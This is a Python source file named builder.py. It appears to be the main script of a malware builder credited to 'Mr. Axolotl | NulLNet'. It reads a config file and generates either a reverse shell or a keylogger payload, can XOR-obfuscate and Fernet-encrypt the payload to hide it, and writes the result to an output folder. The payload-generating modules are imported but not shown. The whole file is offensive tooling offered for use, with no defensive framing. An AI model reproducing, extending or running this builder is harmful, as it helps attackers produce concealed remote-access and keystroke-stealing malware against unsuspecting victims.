# builder.py

import os
import json
from modules import reverse_shell, keylogger, encryptor, obfuscator

def load_config():
    with open("config.json", "r") as file:
        return json.load(file)

def main():
    config = load_config()

    if config["payload_type"] == "reverse_shell":
        code = reverse_shell.generate(config)
    elif config["payload_type"] == "keylogger":
        code = keylogger.generate(config)
    else:
        raise ValueError("Unknown payload type")

    if config["obfuscate"]:
        code = obfuscator.apply_xor(code, config["xor_key"])

    if config["encrypt"]:
        code = encryptor.encrypt_fernet(code, config["fernet_key"])

    filename = f"output/{config['output_name']}"
    with open(filename, "w") as out:
        out.write(code)

    print(f"\n✅ Payload generated: {filename}")
    print("🔗 Attribution: Created by Mr. Axolotl | NulLNet")

if __name__ == "__main__":
    main()
